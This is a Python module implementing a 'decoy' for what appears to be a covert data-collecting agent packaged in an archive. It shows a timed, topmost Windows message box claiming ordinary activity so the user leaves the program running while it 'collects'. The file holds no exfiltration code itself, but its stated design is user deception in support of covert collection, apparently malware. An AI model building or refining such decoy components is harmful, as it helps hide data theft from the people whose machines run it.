"""The decoy: one dialog, on screen, for a bounded number of seconds.

What this is for. A program that collects for two minutes and shows nothing at all is a
program a user closes because nothing happened. A program that shows a dialog saying it
is doing something ordinary is a program they leave alone. This is the whole feature,
and it is deliberately small: one window, one message, one timer.

Three rules shape the code:

1. **It never blocks the run.** ``MessageBoxW`` waits for a click, and nobody is sitting
   at a machine this is running on. ``MessageBoxTimeoutW`` takes a millisecond count and
   closes itself. Where that export is missing, ``MessageBoxW`` goes in a daemon thread
   and the thread is simply abandoned at exit.
2. **A dialog that cannot be shown is not a failed run.** Every call here is wrapped:
   the collection is the job, a window is decoration.
3. **The bounds are enforced here as well as in the build.** The values arrive from an
   archive, and an archive is a file. Nothing in it is trusted to be the size the form
   said it was.
"""

from __future__ import annotations

import threading
from typing import Final

# Must match ``core/schema.py``. The agent ships inside the archive and cannot import
# the core package; ``tests/test_contracts.py`` pins the pair.
MAX_DECOY_SECONDS: Final[int] = 600
MAX_DECOY_TEXT: Final[int] = 512

_MB_OK: Final[int] = 0x00000000
_MB_ICONINFORMATION: Final[int] = 0x00000040
_MB_SETFOREGROUND: Final[int] = 0x00010000
_MB_TOPMOST: Final[int] = 0x00040000
_FLAGS: Final[int] = _MB_OK | _MB_ICONINFORMATION | _MB_SETFOREGROUND | _MB_TOPMOST

# The dialog owns the foreground for a moment; a run that starts during a login storm
# should not fight for it. Not configurable: it is a property of the API, not a choice.
_LANGUAGE: Final[int] = 0


def _clip(text: str) -> str:
    return text if len(text) <= MAX_DECOY_TEXT else text[:MAX_DECOY_TEXT]


def show(title: str, text: str, seconds: int) -> bool:
    """Put one dialog on screen for ``seconds``. Returns whether it was shown.

    Synchronous on purpose: the caller decides whether to wait. The timeout export makes
    that safe, and a caller that wants the collection to start immediately calls
    ``start`` instead.
    """
    if seconds <= 0 or seconds > MAX_DECOY_SECONDS:
        return False

    title = _clip(title).strip()
    text = _clip(text).strip()
    if not title and not text:
        return False
    # A caption with no text is an empty box. The text is the message; the caption is a
    # label on it, so an empty caption borrows the text rather than blanking the frame.
    if not text:
        text = title
    if not title:
        title = text

    try:
        import ctypes
        from ctypes import wintypes

        user32 = ctypes.WinDLL("user32", use_last_error=True)
        milliseconds = seconds * 1000

        timeout = getattr(user32, "MessageBoxTimeoutW", None)
        if timeout is not None:
            timeout.argtypes = [
                wintypes.HWND,
                wintypes.LPCWSTR,
                wintypes.LPCWSTR,
                wintypes.UINT,
                wintypes.WORD,
                wintypes.DWORD,
            ]
            timeout.restype = ctypes.c_int
            timeout(None, text, title, _FLAGS, _LANGUAGE, milliseconds)
            return True

        # The export is not in every user32. Blocking here would hang the run, which is
        # why this goes on a thread that is never joined: the process exits around it.
        user32.MessageBoxW.argtypes = [
            wintypes.HWND,
            wintypes.LPCWSTR,
            wintypes.LPCWSTR,
            wintypes.UINT,
        ]
        user32.MessageBoxW.restype = ctypes.c_int
        worker = threading.Thread(
            target=user32.MessageBoxW,
            args=(None, text, title, _FLAGS),
            name="sable-decoy",
            daemon=True,
        )
        worker.start()
        return True
    except Exception:
        # No user32, no session, no window station. Decoration, not delivery.
        return False


def start(title: str, text: str, seconds: int) -> threading.Thread | None:
    """Show the dialog without waiting for it. ``None`` when there is nothing to show."""
    if seconds <= 0:
        return None
    worker = threading.Thread(
        target=show,
        args=(title, text, seconds),
        name="sable-decoy",
        daemon=True,
    )
    worker.start()
    return worker


__all__ = ["MAX_DECOY_SECONDS", "MAX_DECOY_TEXT", "show", "start"]
